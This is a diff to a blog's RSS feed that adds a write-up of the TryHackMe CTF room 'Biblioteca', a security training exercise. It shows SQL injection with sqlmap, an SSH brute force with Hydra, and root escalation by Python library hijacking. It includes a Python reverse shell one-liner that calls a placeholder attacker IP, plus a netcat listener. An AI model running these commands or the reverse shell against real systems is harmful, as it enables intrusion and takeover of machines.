@@ -6,8 +6,185 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 20 Jun 2022 11:14:00 +0000</lastBuildDate>
+        <lastBuildDate>Fri, 08 Jul 2022 13:04:00 +0000</lastBuildDate>
         <atom:link href="https://robscharf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM: Biblioteca -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/07/thm-biblioteca--write-up/</link>
+            <pubDate>Fri, 08 Jul 2022 13:04:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/07/thm-biblioteca--write-up/</guid>
+            <description>About Biblioteca is a medium rated CTF room on TryHackMe. Rooting this box involves carrying out a successful SQL injection to obtain a foothold, identifying an opportunity for a &amp;ldquo;lateral privilege escalation&amp;rdquo; via brute-force attack, and further escalation to root via Python library hijacking.
+Note: I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Enumeration nmap I began by running a standard nmap scan against the target host.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>Biblioteca is a <em>medium</em> rated CTF room on <a href="www.tryhackme.com">TryHackMe</a>. Rooting this box involves carrying out a successful SQL injection to obtain a foothold, identifying an opportunity for a &ldquo;lateral privilege escalation&rdquo; via brute-force attack, and further escalation to <code>root</code> via Python library hijacking.</p>
+<p><strong>Note:</strong> I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<p>I began by running a standard nmap scan against the target host.</p>
+<p><code>nmap -sCV -oN nmap.out &lt;target-ip&gt;</code></p>
+<pre tabindex="0"><code>Nmap scan report for &lt;target-ip&gt;
+Host is up (0.099s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
+|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
+|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
+
+8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title:  Login 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Our scan identified two active/open ports, <code>22</code>, which hosts a standard OpenSSH service and <code>8000</code>, which houses a Werkzeug python. While Werkzeug is <em>primarily</em> a Python library, it has the ablity to function as a development http server for testing purposes. This is often the CTF context that it appears in.</p>
+<h3 id="manual-enumeration">Manual enumeration</h3>
+<p>Visiting the Werkzeug port via a web browser immediately redirects us to <code>http://&lt;target-ip&gt;:8000/login</code>.</p>
+<p><img src="/images/biblioteca/login.png" alt="biblioteca-login"></p>
+<p>This seems to be a standard login page/form. We can register a standard account with no problem, but that doesn&rsquo;t get us anything other than a polite welcome message.</p>
+<h2 id="sql-injection">SQL Injection</h2>
+<p>As we were able to register a new set of credentials, we can assume that the data is being stored somewhere. Thus, we can probe the form with SQLMap to identify whether or not it is vulnerable to an SQL injection attack.</p>
+<h3 id="sqlmap">SQLMap</h3>
+<p><code>sqlmap -u http://&lt;target-ip&gt;:8000/login --data 'username='test'&amp;password='test'' --dbs --dump</code></p>
+<pre tabindex="0"><code>[13:05:47] [INFO] testing connection to the target URL
+[13:05:48] [INFO] testing if the target URL content is stable
+[13:05:48] [INFO] target URL content is stable
+[13:05:48] [INFO] testing if POST parameter &#39;username&#39; is dynamic
+
+✂️ ................................ ✂️
+
+[13:06:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.12
+[13:06:26] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] website
+
+[13:06:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[13:06:27] [INFO] fetching current database
+[13:06:27] [INFO] fetching tables for database: &#39;website&#39;
+[13:06:27] [INFO] fetching columns for table &#39;users&#39; in database &#39;website&#39;
+[13:06:27] [INFO] fetching entries for table &#39;users&#39; in database &#39;website&#39;
+Database: website
+Table: users
+[1 entry]
++----+-------------------+----------------+----------+
+| id | email             | password       | username |
++----+-------------------+----------------+----------+
+| 1  | s-----@email.boop | M------------ | s-----   |
++----+-------------------+----------------+----------+
+</code></pre><h2 id="foothold">Foothold</h2>
+<p>Now that we have user credentials, we can use them to log-in to the server via SSH. From there, we do more manual enumeration to identify a privilege escalation vector.</p>
+<h3 id="more-enumeration">More Enumeration</h3>
+<pre tabindex="0"><code>s-----@biblioteca:~$ pwd
+/home/s-----
+</code></pre><pre tabindex="0"><code>s-----@biblioteca:~$ cat /etc/passwd
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+✂️ ................................ ✂️
+s-----❌1000:1000:s-----:/home/s-----:/bin/bash
+lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false
+mysql❌113:117:MySQL Server,,,:/nonexistent:/bin/false
+h----❌1001:1001::/home/h----:/bin/bash
+</code></pre><p>Great! From the <code>/etc/passwd</code> file, we can see that there is also user <code>h----</code>. Let&rsquo;s check their home directory.</p>
+<pre tabindex="0"><code>s-----@biblioteca:/home/h----$ ls -lsa
+total 32
+4 drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
+4 drwxr-xr-x 4 root  root  4096 Dec  7 02:42 ..
+0 lrwxrwxrwx 1 root  root     9 Dec  7 03:24 .bash_history -&gt; /dev/null
+4 -rw-r--r-- 1 h---- h----  220 Feb 25  2020 .bash_logout
+4 -rw-r--r-- 1 h---- h---- 3771 Feb 25  2020 .bashrc
+4 drwx------ 2 h---- h---- 4096 Dec  7 02:54 .cache
+4 -rw-r----- 1 root  h----  497 Dec  7 02:53 hasher.py
+4 -rw-r--r-- 1 h---- h----  807 Feb 25  2020 .profile
+4 -rw-r----- 1 root  h----   45 Mar  2 03:01 user.txt
+0 -rw------- 1 h---- h----    0 Dec  7 03:23 .viminfo
+</code></pre><p>In addition to the user flag, we see that there is a script named <code>hasher.py</code> in the <code>h----</code> home directory. Moreover, this file is owned by root!</p>
+<pre tabindex="0"><code>s-----@biblioteca:/home/h----$ sudo -l
+[sudo] password for s-----: 
+Sorry, user s----- may not run sudo on biblioteca.
+</code></pre><h2 id="exploitation---ssh">Exploitation - SSH</h2>
+<p>While we can&rsquo;t interact with it as <code>s-----</code>, it&rsquo;s likely that we will be able to as the user <code>h----</code>. Let&rsquo;s try to brute force that account&rsquo;s SSH credentials with Hydra.</p>
+<p><code>hydra -t 4 -l h---- -P /usr/share/wordlists/rockyou.txt -vV &lt;target-ip&gt; ssh</code></p>
+<pre tabindex="0"><code>[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;12345&#34; - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;123456789&#34; - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;password&#34; - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;iloveyou&#34; - 5 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;princess&#34; - 6 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;1234567&#34; - 7 of 14344399 [child 2] (0/0)
+✂️ ................................ ✂️
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;yomama&#34; - 2056 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;spooky&#34; - 2057 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;pimpin1&#34; - 2058 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;maricel&#34; - 2059 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;gizmo1&#34; - 2060 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;dondon&#34; - 2061 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;divine&#34; - 2062 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;chucky&#34; - 2063 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;aries&#34; - 2064 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;rowena&#34; - 2065 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;nokia&#34; - 2066 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;stitch&#34; - 2067 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;jerry&#34; - 2068 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;h----&#34; - pass &#34;h----&#34; - 2069 of 14344399 [child 2] (0/0)
+[22][ssh] host: &lt;target-ip&gt;   login: h----   password: h----
+[STATUS] attack finished for &lt;target-ip&gt; (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre><p>We can now connect as user <code>h----</code> via SSH and access <code>hasher.py</code> (as well as the user flag)!</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo--l"><code>sudo -l</code></h3>
+<p><strong>As a refresher:</strong> The <code>sudo</code> command represents one of the most straightforward Linux privilege escalation vectors. By default, the command allows you to run a program with root privileges. Beyond this, system administrators may provision standard user accounts <code>sudo</code> privileges related to the execution of context-specific program execution.</p>
+<p>To check which, if any, <code>sudo</code> privileges that a user has, we can run <code>sudo</code> with the <code>-l</code> flag to list commands that the current user is allowed (and/or prohibited) from executing with elevated permissions. The <code>-U</code> flag can be used to specify another valid user on the current host machine.</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ sudo -l
+Matching Defaults entries for h---- on biblioteca:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User h---- may run the following commands on biblioteca:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/h----/hasher.py
+</code></pre><p>Here we see <code>SETENV</code>, which means we can set the environment variables while running the listed script as root! In this context, we see that <code>hasher.py</code> imports <code>hashlib.py</code>.</p>
+<p>Thus, we have the ability to create a fraudulent <code>hashlib.py</code> file containing reverse shell code that the user <code>h----</code> can execute as <code>root</code> via <code>hasher.py</code>.</p>
+<p>First, we find <code>hashlib.py</code>:</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ find / -name hashlib.py 2&gt;/dev/null
+/snap/core20/1361/usr/lib/python3.8/hashlib.py
+/snap/core20/1270/usr/lib/python3.8/hashlib.py
+/snap/core18/2284/usr/lib/python3.6/hashlib.py
+/snap/core18/2253/usr/lib/python3.6/hashlib.py
+/usr/lib/python3/dist-packages/landscape/lib/hashlib.py
+/usr/lib/python3/dist-packages/nacl/hashlib.py
+/usr/lib/python3.8/hashlib.py
+</code></pre><p>We then copy the script to  the <code>/tmp</code> directory:</p>
+<pre tabindex="0"><code>h----@biblioteca:/usr/lib/python3.8$ cp hashlib.py /tmp
+h----@biblioteca:/usr/lib/python3.8$ cd /tmp
+</code></pre><p>Next, we edit our &ldquo;new&rdquo; <code>hashlib.py</code> script to contain a basic python reverse shell:</p>
+<pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;attack-ip&gt;&#34;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)
+</code></pre><p>Finally, we take advantage of our <code>SETENV</code> privileges to run the script with an added <code>PYTHONPATH</code> argument. <code>PYTHONPATH</code> is an environmental variable that adds an additional directory (or directories) that Python checks for modules and packages at runtime. Conventionally, this is used to include custom Python libraries that are otherwise inappropriate to place in the default global location.</p>
+<pre tabindex="0"><code>h----@biblioteca:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/h----/hasher.py
+</code></pre><pre tabindex="0"><code>╭─[kali-bot] as virtualtack in ~
+╰──➤ nc -lvnp &lt;port&gt;                        
+listening on [any] &lt;port&gt; ...
+connect to [&lt;my=ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 35176
+# whoami
+whoami
+root
+# ls /root 
+ls /root
+root.txt  snap
+# cat /root/root.txt
+cat /root/root.txt
+THM{P-----------------------}
+</code></pre><h2 id="lessons-learned">Lessons learned</h2>
+<ul>
+<li>I often forget to stabilize my python-enabled shells as a reflexive best practice. This can be done, for example, with <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+<li>This room introduced me to Python library hijacking. More can be read about this topic on:
+<ul>
+<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/">Raj Chandel&rsquo;s Hacking Articles</a></li>
+<li><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">rastating.github.io</a></li>
+</ul>
+</li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>I passed the eJPT!</title>
